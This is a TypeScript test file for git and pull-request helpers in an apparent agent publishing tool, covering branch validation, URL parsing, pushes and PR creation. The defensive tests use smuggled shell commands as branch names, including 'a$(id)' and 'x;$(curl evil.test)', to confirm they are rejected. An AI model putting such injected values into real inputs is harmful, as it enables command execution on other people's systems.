import assert from "node:assert/strict";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

import { LocalExecutor } from "@neutron-build/agents";

import {
  assertGitSafe,
  authenticatedUrl,
  commitAndPush,
  findOpenPullRequest,
  openPullRequest,
  parseRepoUrl,
  pullRequestUrl,
  resolvePr,
  setupRepo,
} from "./git.js";
import { credentialFor } from "./repo-policy.js";

test("assertGitSafe rejects shell-active refs (command-injection defense)", () => {
  // These are all valid git branch names but would execute under sh -c.
  for (const bad of ["a$(id)", "a`id`b", "a;id", "a|id", "a&&id", "a b", "a>b", "a\nid", "-x", "..", "a/../b", "/lead", "trail/"]) {
    assert.throws(() => assertGitSafe("branch", bad), new RegExp("unsafe git"), `should reject ${JSON.stringify(bad)}`);
  }
  // Legitimate names pass through unchanged.
  for (const ok of ["main", "feat/x-1", "release-2.0", "ship/auth-race", "a_b.c"]) {
    assert.equal(assertGitSafe("branch", ok), ok);
  }
});

test("parseRepoUrl refuses an owner/repo with injection characters", () => {
  assert.throws(() => parseRepoUrl("http://h/o/r$(id)"), /unsafe git/);
  assert.throws(() => parseRepoUrl("http://h/ow;ner/repo"), /unsafe git/);
});

test("parseRepoUrl: forgejo and github, .git suffix, credentials URL", () => {
  const forgejo = parseRepoUrl("http://forgejo.example.com:3000/Tyler/teploy-ship.git");
  assert.equal(forgejo.kind, "forgejo");
  assert.equal(forgejo.base, "http://forgejo.example.com:3000");
  assert.equal(forgejo.owner, "Tyler");
  assert.equal(forgejo.repo, "teploy-ship");
  assert.equal(forgejo.cloneUrl, "http://forgejo.example.com:3000/Tyler/teploy-ship.git");

  const github = parseRepoUrl("https://github.com/useteploy/teploy");
  assert.equal(github.kind, "github");
  assert.equal(github.cloneUrl, "https://github.com/useteploy/teploy.git");

  assert.equal(authenticatedUrl(forgejo, "s3cr3t"), "http://s3cr3t@forgejo.example.com:3000/Tyler/teploy-ship.git");
  assert.throws(() => parseRepoUrl("git@github.com:a/b.git"));
  assert.throws(() => parseRepoUrl("http://host/onlyowner"));
});

test("setupRepo + commitAndPush against a local bare remote", async () => {
  // a bare "origin" seeded with one commit on main
  const bare = await mkdtemp(join(tmpdir(), "ship-git-bare-"));
  const seed = await mkdtemp(join(tmpdir(), "ship-git-seed-"));
  const seeder = new LocalExecutor({ root: seed });
  await seeder.exec(`git init -q -b main . && git config user.email t@t && git config user.name t && echo hello > readme.md && git add -A && git commit -qm seed && git clone -q --bare . ${bare}/repo.git`);

  // parseRepoUrl requires http(s); build the ref by hand for the file:// remote
  const ref = {
    kind: "forgejo" as const,
    base: "file://",
    owner: "local",
    repo: "repo",
    cloneUrl: `${bare}/repo.git`,
  };

  const work = await mkdtemp(join(tmpdir(), "ship-git-work-"));
  const executor = new LocalExecutor({ root: work });
  // file:// remotes take no credentials — token still exercised in the URL builder path above
  const checkout = await setupRepo(executor, { ref: { ...ref, cloneUrl: ref.cloneUrl }, token: "", runId: "run-test1234" });
  assert.equal(checkout.base, "main");
  assert.equal(checkout.branch, "ship/run-test1234");

  // no changes -> "empty" (no PR)
  assert.deepEqual(await commitAndPush(executor, { ref, token: "", checkout, message: "noop" }), { kind: "empty" });

  // agent-style tree edit -> committed and pushed
  await executor.exec("echo fixed >> readme.md && echo new > lib.py");
  const pushed = await commitAndPush(executor, { ref, token: "", checkout, message: "fix: the thing\n\nrun-test1234" });
  assert.equal(pushed.kind, "pushed", "an ordinary two-file change passes the publication screen");

  const check = new LocalExecutor({ root: bare });
  const branchList = await check.exec("cd repo.git && git branch --list 'ship/*'");
  assert.match(branchList.stdout, /ship\/run-test1234/);
  const show = await check.exec("cd repo.git && git show ship/run-test1234:lib.py");
  assert.equal(show.stdout.trim(), "new");
  const author = await check.exec("cd repo.git && git log -1 --format='%an <%ae>' ship/run-test1234");
  assert.match(author.stdout, /Teploy Ship <ship@teploy\.dev>/);
});

test("openPullRequest hits the right endpoint per host kind", async () => {
  const calls: Array<{ url: string; init: RequestInit }> = [];
  const fetchImpl = (async (url: string | URL | Request, init?: RequestInit) => {
    calls.push({ url: String(url), init: init ?? {} });
    return new Response(JSON.stringify({ number: 7, html_url: "http://pr/7" }), { status: 201 });
  }) as typeof fetch;

  const forgejo = parseRepoUrl("http://forge.example:3000/Tyler/app");
  const pr = await openPullRequest({ ref: forgejo, token: "tok", head: "ship/x", base: "main", title: "t", body: "b", fetchImpl });
  assert.equal(pr.number, 7);
  assert.equal(calls[0]?.url, "http://forge.example:3000/api/v1/repos/Tyler/app/pulls");
  assert.equal((calls[0]?.init.headers as Record<string, string>).authorization, "token tok");

  const github = parseRepoUrl("https://github.com/o/r");
  await openPullRequest({ ref: github, token: "tok", head: "ship/x", base: "main", title: "t", body: "b", fetchImpl });
  assert.equal(calls[1]?.url, "https://api.github.com/repos/o/r/pulls");
  assert.equal((calls[1]?.init.headers as Record<string, string>).authorization, "Bearer tok");

  // failure surfaces status + body
  const failImpl = (async () => new Response("nope", { status: 422 })) as typeof fetch;
  await assert.rejects(
    () => openPullRequest({ ref: forgejo, token: "tok", head: "h", base: "b", title: "t", body: "b", fetchImpl: failImpl }),
    /422.*nope/s,
  );
});

test("credentialFor picks the GitHub token for github.com, default elsewhere", () => {
  const github = parseRepoUrl("https://github.com/o/r");
  const forgejo = parseRepoUrl("http://forgejo.example.com:3000/o/r.git");
  assert.equal(credentialFor(github, { gitToken: "fj", githubToken: "gh" }), "gh");
  assert.equal(credentialFor(github, { gitToken: "fj" }), "fj", "single-token deploys keep working");
  assert.equal(credentialFor(forgejo, { gitToken: "fj", githubToken: "gh" }), "fj");
  assert.equal(credentialFor(forgejo, {}), "");
});

test("TS-044: the human PR path is /pull on GitHub and /pulls elsewhere", () => {
  const gh = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const fj = parseRepoUrl("http://forgejo.example.com:3000/tyler/teploy-ship");
  assert.equal(pullRequestUrl(gh, 12), "https://github.com/useteploy/teploy-cli/pull/12");
  assert.equal(pullRequestUrl(fj, 12), "http://forgejo.example.com:3000/tyler/teploy-ship/pulls/12");
});

test("TS-023: a fork PR keeps the head repository, a same-repo PR does not", async () => {
  const ref = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const reply = (body: unknown) =>
    (async () => ({ ok: true, json: async () => body })) as unknown as typeof fetch;

  const fork = await resolvePr(ref, "t", 7, reply({
    head: { ref: "patch-1", sha: "abc123", repo: { full_name: "outsider/teploy-cli", clone_url: "https://github.com/outsider/teploy-cli.git" } },
    base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
  }));
  assert.equal(fork.branch, "patch-1");
  assert.equal(fork.headRepo, "https://github.com/outsider/teploy-cli.git", "the branch lives in the fork, not the base");
  assert.equal(fork.headSha, "abc123");

  const same = await resolvePr(ref, "t", 8, reply({
    head: { ref: "ship/run-1", sha: "def456", repo: { full_name: "useteploy/teploy-cli", clone_url: "https://github.com/useteploy/teploy-cli.git" } },
    base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
  }));
  assert.equal(same.headRepo, undefined, "same-repo PRs fetch from origin as before");
});

test("a fork's branch name is still validated before it reaches a shell", async () => {
  const ref = parseRepoUrl("https://github.com/useteploy/teploy-cli");
  const evil = (async () => ({
    ok: true,
    json: async () => ({
      head: { ref: "x;$(curl evil.test)", repo: { full_name: "o/r", clone_url: "https://github.com/o/r.git" } },
      base: { ref: "main", repo: { full_name: "useteploy/teploy-cli" } },
    }),
  })) as unknown as typeof fetch;
  await assert.rejects(() => resolvePr(ref, "t", 9, evil), /refusing unsafe git branch/);
});

test("TS-003: incomplete work publishes as a draft (GitHub) or WIP (Forgejo)", async () => {
  const bodies: Array<Record<string, unknown>> = [];
  const fetchImpl = (async (_url: string, init?: RequestInit) => {
    bodies.push(JSON.parse(String(init?.body)));
    return { ok: true, json: async () => ({ number: 3, html_url: "http://x/pull/3" }) };
  }) as unknown as typeof fetch;

  await openPullRequest({
    ref: parseRepoUrl("https://github.com/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", draft: true, fetchImpl,
  });
  assert.equal(bodies[0]!.draft, true, "GitHub takes a draft flag");
  assert.equal(bodies[0]!.title, "fix the thing", "and needs no title marker");

  await openPullRequest({
    ref: parseRepoUrl("http://forge.test/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", draft: true, fetchImpl,
  });
  assert.equal(bodies[1]!.draft, undefined, "Forgejo has no draft flag on create");
  assert.equal(bodies[1]!.title, "WIP: fix the thing", "so it uses the WIP prefix its UI honours");

  await openPullRequest({
    ref: parseRepoUrl("http://forge.test/o/r"),
    token: "t", head: "h", base: "main", title: "fix the thing", body: "b", fetchImpl,
  });
  assert.equal(bodies[2]!.title, "fix the thing", "a completed run is not marked WIP");
});

test("TS-015: an existing open PR is found rather than duplicated on replay", async () => {
  const ref = parseRepoUrl("http://forge.test/o/r");
  const found = (async () => ({
    ok: true,
    json: async () => [{ number: 5, html_url: "http://forge.test/o/r/pulls/5", head: { ref: "ship/run-1" } }],
  })) as unknown as typeof fetch;
  const existing = await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: found });
  assert.equal(existing?.number, 5);

  const none = (async () => ({ ok: true, json: async () => [] })) as unknown as typeof fetch;
  assert.equal(await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: none }), null);

  // A failed lookup must not block publishing — it returns null and the caller creates.
  const broken = (async () => ({ ok: false, json: async () => ({}) })) as unknown as typeof fetch;
  assert.equal(await findOpenPullRequest({ ref, token: "t", head: "ship/run-1", owner: "o", fetchImpl: broken }), null);
});
